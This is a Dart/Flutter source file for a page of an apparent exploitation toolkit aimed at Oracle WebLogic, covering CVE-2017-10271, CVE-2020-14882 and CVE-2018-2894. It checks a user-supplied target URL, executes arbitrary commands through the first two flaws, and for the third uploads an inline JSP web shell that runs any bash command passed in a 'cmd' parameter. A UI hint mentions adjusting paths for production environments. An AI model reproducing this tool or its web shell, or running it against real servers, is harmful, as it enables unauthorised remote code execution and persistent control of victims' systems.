import 'package:flutter/material.dart';

import '../../app/constants.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '../../theme/app_theme.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';

class WebLogicExpPage extends BaseVulhubExpPage {
  const WebLogicExpPage({super.key});

  @override
  State<WebLogicExpPage> createState() => _WebLogicPageState();
}

class _WebLogicPageState extends BaseVulhubExpPageState<WebLogicExpPage> {
  @override
  IconData get pageIcon => Icons.dns;

  @override
  String get appBarTitle =>
      'Oracle WebLogic CVE-2017-10271 / CVE-2020-14882 / CVE-2018-2894 RCE';

  @override
  String get cardTitle => 'Oracle WebLogic RCE';

  @override
  String get cardSubtitle =>
      'XMLDecoder 反序列化 + 控制台未授权 + WS 测试页文件上传 RCE';

  final _urlCtrl      = TextEditingController();
  final _cmdCtrl      = TextEditingController(text: 'id');
  final _timeoutCtrl  = TextEditingController();
  final _workDirCtrl  = TextEditingController(
    text: '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer'
        '/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls'
        '/4mcj4y/war/css',
  );

  // 0=CVE-2017-10271  1=CVE-2020-14882  2=CVE-2018-2894
  int _tab = 0;

  WebLogicExpService _svc() => WebLogicExpService(
        baseUrl: _urlCtrl.text.trim(),
        timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
      );

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => running = true);
    if (_tab == 0) {
      appendLog('[*] 检测 CVE-2017-10271 XMLDecoder 端点...');
      try {
        final r = await _svc().checkCve201710271();
        appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到');
      } catch (e) {
        appendLog('[!] 异常: $e');
      }
    } else if (_tab == 1) {
      appendLog('[*] 检测 CVE-2020-14882 控制台路径绕过...');
      try {
        final r = await _svc().checkCve202014882();
        appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到');
      } catch (e) {
        appendLog('[!] 异常: $e');
      }
    } else {
      appendLog('[*] 检测 CVE-2018-2894 Web Service 测试客户端...');
      try {
        final r = await _svc().checkCve20182894();
        appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到');
      } catch (e) {
        appendLog('[!] 异常: $e');
      }
    }
    if (mounted) setState(() => running = false);
  }

  Future<void> _exec() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
    setState(() => running = true);
    if (_tab == 0) {
      appendLog('[*] CVE-2017-10271 XMLDecoder RCE: $cmd');
      try {
        final out = await _svc().execRceCve201710271(cmd);
        appendLog(out != null ? '[+] 响应:\n$out' : '[-] 无响应');
      } catch (e) {
        appendLog('[!] 异常: $e');
      }
    } else if (_tab == 1) {
      appendLog('[*] CVE-2020-14882 控制台 RCE: $cmd');
      try {
        final out = await _svc().execRceCve202014882(cmd);
        appendLog(out != null ? '[+] 响应:\n$out' : '[-] 无响应');
      } catch (e) {
        appendLog('[!] 异常: $e');
      }
    } else {
      appendLog('[!] CVE-2018-2894 无命令执行接口，请使用 GetShell 功能');
    }
    if (mounted) setState(() => running = false);
  }

  Future<void> _getShell2894() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final workDir = _workDirCtrl.text.trim();
    if (workDir.isEmpty) {
      appendLog('[!] 请输入 Work Home Dir');
      return;
    }
    setState(() => running = true);
    appendLog('[*] CVE-2018-2894 GetShell...');
    appendLog('[*] Step 1 — 修改 Work Home Dir: $workDir');
    try {
      // 内联简单 JSP shell（无冰蝎依赖），避免加载 asset 失败
      const shellContent =
          '<%@ page import="java.util.*,java.io.*"%>'
          '<%if(request.getParameter("cmd")!=null){'
          'Process p=Runtime.getRuntime().exec(new String[]{'
          '"/bin/bash","-c",request.getParameter("cmd")});'
          'BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));'
          'StringBuilder sb=new StringBuilder();String line;'
          'while((line=br.readLine())!=null)sb.append(line).append("\\n");'
          'out.print(sb);}%>';
      final shellUrl = await _svc().getShellCve20182894(
        shellContent,
        workDir: workDir,
      );
      if (shellUrl != null) {
        appendLog('[+] Shell 写入成功: $shellUrl?cmd=id');
      } else {
        appendLog('[-] GetShell 失败（路径不可访问或上传被拒）');
        appendLog('[i] 请确认 workDir 对应 /ws_utc/css/ 可从 Web 访问');
      }
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _cmdCtrl.dispose();
    _timeoutCtrl.dispose();
    _workDirCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          vSecTitle('目标配置'),
          vTf(_urlCtrl, '目标 URL', 'http://localhost:7001'),
          const SizedBox(height: 8),
          vTf(
            _timeoutCtrl,
            '超时(s)',
            '${AppConstants.defaultHttpTimeoutSeconds}',
            type: TextInputType.number,
          ),
          const SizedBox(height: 16),
          vSecTitle('CVE 选择'),
          Row(
            children: [
              _tabBtn('CVE-2017-10271', 0),
              const SizedBox(width: 6),
              _tabBtn('CVE-2020-14882', 1),
              const SizedBox(width: 6),
              _tabBtn('CVE-2018-2894', 2),
            ],
          ),
          const SizedBox(height: 8),
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: AppColors.bgDark,
              borderRadius: BorderRadius.circular(6),
              border: Border.all(color: AppColors.border),
            ),
            child: Text(
              switch (_tab) {
                0 => 'XMLDecoder 反序列化 → /wls-wsat/CoordinatorPortType\n无直接回显，需结合 OOB/写文件验证',
                1 => '控制台路径绕过 → /console/css/%252e%252e%252fconsole.portal\n无直接回显',
                _ => '文件上传 → /ws_utc/begin.do 修改工作目录\n再 multipart 上传 JSP → /ws_utc/css/{ts}.jsp',
              },
              style: AppTextStyles.caption(
                size: 11,
                color: AppColors.textSecondary,
              ),
            ),
          ),
          const SizedBox(height: 8),
          vBtn('检测漏洞', running ? null : _check),
          const SizedBox(height: 16),
          if (_tab != 2) ...[
            vSecTitle('命令执行'),
            vTf(_cmdCtrl, '命令', 'id'),
            const SizedBox(height: 8),
            vBtn('执行命令', running ? null : _exec),
          ] else ...[
            vSecTitle('CVE-2018-2894 GetShell'),
            vTf(_workDirCtrl, 'Work Home Dir (css 目录路径)', '/u01/.../css'),
            const SizedBox(height: 8),
            vBtn('GetShell (上传 JSP)', running ? null : _getShell2894),
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: AppColors.bgDark,
                borderRadius: BorderRadius.circular(6),
                border: Border.all(
                    color: AppColors.primary.withValues(alpha: 0.3)),
              ),
              child: Text(
                'Shell 访问: /ws_utc/css/{timestamp}.jsp?cmd=id\n'
                'Work Dir 默认为 vulhub 12.2.1.3 路径，生产环境需调整',
                style: AppTextStyles.caption(
                    size: 10, color: AppColors.textMuted),
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _tabBtn(String label, int idx) => GestureDetector(
        onTap: running ? null : () => setState(() => _tab = idx),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 6),
          decoration: BoxDecoration(
            color: _tab == idx
                ? AppColors.primary.withValues(alpha: 0.2)
                : AppColors.bgDark,
            borderRadius: BorderRadius.circular(6),
            border: Border.all(
              color: _tab == idx
                  ? AppColors.primary.withValues(alpha: 0.6)
                  : AppColors.border,
            ),
          ),
          child: Text(
            label,
            style: AppTextStyles.caption(
              size: 10,
              color: _tab == idx ? AppColors.primary : AppColors.textSecondary,
            ),
          ),
        ),
      );
}
